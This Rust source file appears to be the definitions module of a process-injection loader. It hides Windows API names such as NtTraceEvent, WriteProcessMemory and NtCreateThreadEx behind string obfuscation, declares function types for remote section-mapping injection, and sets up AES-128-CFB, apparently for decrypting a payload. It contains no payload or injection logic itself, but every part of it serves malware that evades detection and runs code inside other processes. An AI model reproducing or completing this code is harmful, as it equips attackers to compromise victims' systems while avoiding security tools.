use std::ffi::c_void;
use windows::Win32::Foundation::HANDLE;
use aes::Aes128;
use cfb_mode::Cfb;
use obfstr::obfstr;
use once_cell::sync::Lazy;


pub static NTDLL_DLL: Lazy<String> = Lazy::new(|| obfstr!("ntdll.dll").to_string());
pub static KERNEL32_DLL: Lazy<String> = Lazy::new(|| obfstr!("kernel32.dll").to_string());
pub static NTTRACE: Lazy<String> = Lazy::new(|| obfstr!("NtTraceEvent").to_string());
pub static WRITEPROC: Lazy<String> = Lazy::new(|| obfstr!("WriteProcessMemory").to_string());
pub static OPENPROC: Lazy<String> = Lazy::new(|| obfstr!("OpenProcess").to_string());
pub static EXITTHREAD: Lazy<String> = Lazy::new(|| obfstr!("ExitThread").to_string());
pub static NTCREATESECTION: Lazy<String> = Lazy::new(|| obfstr!("NtCreateSection").to_string());
pub static NTMAPVIEW: Lazy<String> = Lazy::new(|| obfstr!("NtMapViewOfSection").to_string());
pub static NTUNMAPVIEW: Lazy<String> = Lazy::new(|| obfstr!("NtUnmapViewOfSection").to_string());
pub static NTCREATETHREAD: Lazy<String> = Lazy::new(|| obfstr!("NtCreateThreadEx").to_string());
pub static NTWAITOBJECT: Lazy<String> = Lazy::new(|| obfstr!("NtWaitForSingleObject").to_string());



//Returns are basically NTSTATUS as i32 --

pub type WriteProcessMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAdress: *mut c_void,
    Buffer: *const c_void,
    Size: usize,
    NumberOfBytesWritten: *mut usize
) -> i32;

pub type NtCreateSectionFn = unsafe extern "system" fn(
    SectionHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    MaximumSize: *mut i64,
    SectionPageProtection: u32,
    AllocationAttributes: u32,
    FileHandle: HANDLE,
) -> i32;

pub type NtMapViewOfSectionFn = unsafe extern "system" fn(
    SectionHandle: HANDLE,
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut c_void,
    ZeroBits: usize,
    CommitSize: usize,
    SectionOffset: *mut i64,
    ViewSize: *mut usize,
    InheritDisposition: u32,
    AllocationType: u32,
    Win32Protect: u32,
) -> i32;

pub type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut c_void,
) -> i32;

pub type NtCreateThreadExFn = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: HANDLE,
    StartRoutine: *mut c_void,
    Argument: *mut c_void,
    CreateFlags: u32,
    ZeroBits: usize,
    StackReserve: usize,
    StackCommit: usize,
    AttributeList: *mut c_void,
) -> i32;

pub type OpenProcessFn = unsafe extern "system" fn(
    DesiredAccess: u32,
    InheritHandle: bool,
    ProcessId: u32
) -> HANDLE;

pub type ExitThreadFn = unsafe extern "system" fn(
    ExitCode: u32  
) -> ();

pub type NtWaitForSingleObjectFn = unsafe extern "system" fn(
    Handle: HANDLE,
    Alertable: u8,        
    Timeout: *mut i64,    
) -> i32; 

pub type Aes128Cfb = Cfb<Aes128>;
